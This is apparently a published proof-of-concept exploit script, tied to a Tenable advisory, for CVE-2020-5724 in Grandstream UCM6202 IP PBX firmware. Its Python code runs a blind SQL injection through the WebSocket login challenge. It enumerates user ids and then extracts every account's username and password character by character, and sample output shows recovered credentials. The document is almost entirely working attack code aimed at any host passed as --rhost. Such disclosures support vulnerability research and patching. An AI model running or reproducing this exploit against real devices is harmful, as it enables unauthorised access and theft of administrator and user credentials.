# Exploit Title: Grandstream UCM6202 WebSocket SQL Injection Dump HTTP User Creds
# Date: 05/11/2020
# Exploit Author: Jacob Baines
# Vendor Homepage: http://www.grandstream.com/
# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
# Version: 1.0.20.20 and below
# Tested on: Grandstream UCM6202 1.0.20.20
# CVE : CVE-2020-5724
# Advisory: https://www.tenable.com/security/research/tra-2020-17
# Sample output:
#
# albinolobster@ubuntu:~/poc/grandstream/ucm62xx$ python3 websockify_challenge_injection.py --rhost 192.168.2.1
# [+] Scanning for valid user ids: 999
# [+] Found 6 accounts.
# [+] Guessing user id 0's username length: 5
# [+] Guessing user id 0's username: admin
# [+] Guessing user id 0's password length: 8
# [+] Guessing user id 0's password: labpass1
# ------------------------
# [+] Guessing user id 6's username length: 4
# [+] Guessing user id 6's username: 5000
# [+] Guessing user id 6's password length: 12
# [+] Guessing user id 6's password: yE1n37t^jL6T
# ------------------------
# ...

import sys
import ssl
import time
import json
import asyncio
import argparse
import websockets


# Guess user ids in the DB. These are just incremented values starting at zero.
# Values *can* be deleted so, in theory, there is no reason to limit our search
# to the first 1000 values... except time. Takes a bit to set up and tear down
# the websocket and the device won't let us just use the same socket over and
# over again. So scan the first 1000 ids and store the successful values.
async def guess_user_ids(uri, ssl_context):
    user_id = 0
    id_list = []
    while user_id < 1000:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            print('[+] Scanning for valid user ids: ' + str(user_id), end='\r')
            login = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"\' OR user_id='+str(user_id)+'--"}}'
            await websocket.send(login)
            response = await websocket.recv()
            inject_result = json.loads(response)
            if (inject_result['message']['status'] == 0):
                id_list.append(user_id)
            user_id += 1

    print('\n[+] Found ' + str(len(id_list)) + ' accounts.')
    return id_list

# Given a user ID figure out how long the username is
async def guess_username_length(uri, ssl_context, uid):
    length = 1
    while length < 100:
        print('[+] Guessing user id ' + str(uid) + '\'s username length: ' + str(length), end='\r')
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            login = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"\' OR user_id='+str(uid)+' AND LENGTH(user_name)=' + str(length) + '--"}}'
            await websocket.send(login)
            response = await websocket.recv()
            inject_result = json.loads(response)
            if (inject_result['message']['status'] == 0):
                print('')
                break
            else:
                length = length + 1
                if (length == 100):
                    print('\n[-] Failed to guess the user\'s username length.')
                    sys.exit(0)
    return length

# Guess the user's username. Limited to length bytes. Could optimize out length
# using an additional lookup after each successful match.
async def guess_username(uri, ssl_context, uid, length):
    username = ''
    while len(username) < length:
        value = 0x30
        while value < 0x7e:
            if value == 0x5c:
                value += 1
                continue
            
            temp_user = username + chr(value)
            temp_user_len = len(temp_user)

            print('[+] Guessing user id ' + str(uid) + '\'s username: ' + temp_user, end='\r')
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                challenge = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"\' OR user_id='+str(uid)+' AND substr(user_name,1,' + str(temp_user_len) + ") = '" + temp_user + "'--" + '"}}'
                await websocket.send(challenge)
                response = await websocket.recv()
                inject_result = json.loads(response)
                if (inject_result['message']['status'] == 0):
                    username = temp_user
                    break
                else:
                    value += 1

        if value == 0x80:
            print('')
            print('[-] Failed to determine the password.')
            sys.exit(1)

    print('')
    return username

# Given a username figure out how long the password is
async def guess_password_length(uri, ssl_context, uid, username):
    length = 0
    while length < 100:
        print('[+] Guessing user id ' + str(uid) + '\'s password length: ' + str(length), end='\r')
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            login = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"' + username + '\' AND LENGTH(user_password)==' + str(length) + '--"}}'
            await websocket.send(login)
            response = await websocket.recv()
            inject_result = json.loads(response)
            if (inject_result['message']['status'] == 0):
                break
            else:
                length = length + 1
                # if we hit max password length than we've done something wrong
                if (length == 100):
                    print('[+] Couldn\'t determine the passwords length.')
                    sys.exit(1)

    print('')
    return length

# Guess the user's password. Limited to length bytes. Could optimize out length
# using an additional lookup after each successful match.
async def guess_password(uri, ssl_context, uid, username, length):
    # Now that we know the password length, just guess each password byte until
    # we've reached the full length. Again timeout set to 10 seconds.
    password = ''
    while len(password) < length:
        value = 0x20
        while value < 0x80:

            print('[+] Guessing user id ' + str(uid) + '\'s password: ' + password + chr(value), end='\r')

            if value == 0x22 or value == 0x5c:
                temp_pass = password + '\\'
                temp_pass = temp_pass + chr(value)
            else:
                temp_pass = password + chr(value)
            
            temp_pass_len = len(temp_pass)

            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                challenge = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"' + username + "' AND substr(user_password,1," + str(temp_pass_len) + ") = '" + temp_pass + "'--" + '"}}'
                await websocket.send(challenge)
                response = await websocket.recv()
                inject_result = json.loads(response)
                if (inject_result['message']['status'] == 0):
                    password = temp_pass
                    break
                else:
                    value = value + 1

        if value == 0x80:
            print('')
            print('[-] Failed to determine the password.')
            sys.exit(1)

    return password

##
# Using an SQL injection in the challenge generation portion of the login that
# occurs over websocket, extract all of the usernames and passwords.
##
async def guess_users(ip, port):

    # the path to exploit
    uri = 'wss://' + ip + ':' + str(8089) + '/websockify'

    # no ssl verification
    ssl_context = ssl.SSLContext()
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False

    id_list = await guess_user_ids(uri, ssl_context)

    # loop over all the ids.
    for uid in id_list:

        length = await guess_username_length(uri, ssl_context, uid)
        username = await guess_username(uri, ssl_context, uid, length)
        length = await guess_password_length(uri, ssl_context, uid, username)
        password = await guess_password(uri, ssl_context, uid, username, length)

        print('\n------------------------')

top_parser = argparse.ArgumentParser(description='')
top_parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote host to connect to")
top_parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to connect to", default=8089)
args = top_parser.parse_args()

asyncio.get_event_loop().run_until_complete(guess_users(args.rhost, args.rport))
